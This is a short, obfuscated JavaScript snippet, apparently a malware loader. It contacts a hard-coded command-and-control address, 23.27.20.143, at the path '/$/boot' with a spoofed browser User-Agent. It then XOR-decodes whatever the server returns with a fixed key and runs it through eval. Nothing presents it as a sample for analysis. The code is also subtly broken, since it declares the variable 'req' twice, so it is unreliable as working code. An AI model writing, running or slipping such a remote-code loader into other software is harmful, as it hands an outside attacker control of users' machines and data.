(function() {
    _global = global;
    _global['_H'] = 'http://23.27.20.143:' + 0x6989;
    ((async () => {
        await eval(function(encodedData) {
            const key = 'ThZG+0jfXE6VAGOJ';
            let keyLength = key['length'];
            let decoded = '';
            for (let i = 0x0; i < encodedData['length']; i++) {
                const g = encodedData.charCodeAt(i);
                const h = key.charCodeAt(i % keyLength);
                decoded += String.fromCharCode(g ^ h)
            };
            return decoded;
        }(await new _global['Promise']((resolve, reject) => {
            const cncUrl = new _global[('URL')](_global['_H'] + '/$/boot');
            let headers = {};
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36';
            headers['Sec-V'] = _global['_V'] || 0x0;

            const req = {};
            req['method'] = 'GET'
            req['hostname'] = cncUrl['hostname'];
            req['port'] = cncUrl['port'];
            req['path'] = cncUrl['pathname'];
            req['headers'] = headers;

            let req = _global['r']('http')['request'](req, (res) => {
                    let fullRespBody = '';
                    res['on']('data', (chunk) => {
                        fullRespBody += chunk
                    });
                    res['on']('end', () => {
                        resolve(fullRespBody)
                    })
                });
            req['on']('error', (res) => {
                reject(res)
            });
            req['end']()
        })))
    })());
})()